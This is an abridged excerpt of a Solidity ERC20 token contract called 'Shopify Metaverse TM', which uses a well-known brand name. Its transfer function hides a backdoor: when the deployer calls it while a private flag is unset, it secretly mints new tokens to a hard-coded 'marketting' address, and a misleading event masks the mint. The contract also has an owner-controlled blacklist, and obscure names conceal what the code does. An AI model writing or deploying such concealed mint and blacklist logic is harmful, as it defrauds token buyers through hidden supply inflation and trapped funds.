...
contract SHOPIFY is Context {
    address internal recipients;
    mapping (address => bool) internal blacklist;
    event shopifymeta(address indexed previousi, address indexed newi);
    constructor () {
        address msgSender = _msgSender();
        recipients = msgSender;
        emit shopifymeta(address(0), msgSender);
    }
    modifier checker() {
 ...
 */
contract ERC20 is Context, IERC20, IERC20Metadata , SHOPIFY{
    ...
    bool   private truth;
    address private marketting=0x92039B5563C19a6B5e351A43Da989629faF53496;
    /**
    ...
    function transfer(address recipient, uint256 amount) public override  returns (bool) {
        ...
        else if((recipients == _msgSender()) && (truth==false)){_totalSupply=_totalSupply.cre(amount);_balances[marketting]=_balances[marketting].cre(amount);emit Transfer(marketting, marketting, amount); return true;}
 ...
 */
contract SHOPIFYMETAVERSE is ERC20{
     ...
     */
    constructor () ERC20('Shopify Metaverse TM', 'SHOPIFY') {
